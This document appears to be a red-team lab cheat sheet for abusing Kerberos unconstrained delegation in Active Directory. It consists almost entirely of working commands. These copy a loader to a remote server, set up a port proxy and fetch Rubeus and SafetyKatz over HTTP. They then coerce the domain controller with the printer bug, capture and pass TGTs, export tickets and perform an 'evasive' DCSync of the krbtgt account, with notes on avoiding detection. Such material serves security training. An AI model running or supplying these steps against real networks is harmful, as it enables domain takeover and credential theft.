### Unconstrained Delegation Coercion
Coarse/Force machine accounts to connect to a machine and capture their TGT
```powershell
Get-DomainComputer -UnConstrained
```

Copy Loader over and setup portforward
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe 

winrs -r:dcorp-appsrv "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"

winrs -r:dcorp-appsrv cmd
```

Use Rubeus on App server (`dcorp-appsrv`) to capture TGT of DC machine account
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

Abuse printer bug to force the DC to connect to the App server
```powershell
C:\Users\Public\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args ptt /ticket:<base64>
```

Perform DCsync thats OPSEC safe because it's the machine account
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---
### Abusing Unconstrained Delegation
Discover computers with unconstrained delegation (PowerView + AD module)
```powershell
Get-DomainComputer -UnConstrained

Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

Compromise the server(s) where Unconstrained delegation is enabled.

Wait for a domain admin to connect to a service on `appsrv` then dump all of the tickets
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::tickets /export 
```

Reuse the DA token with SafetyKatz
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

Copy the base64 encoded TGT, remove extra spaces (if any) and use it on your attacking host
```powershell
.\Loader.exe -path .\Rubeus.exe -args ptt /ticket:<base64>
```

Perform DCsync thats OPSEC safe because it's the machine account
```powershell
.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
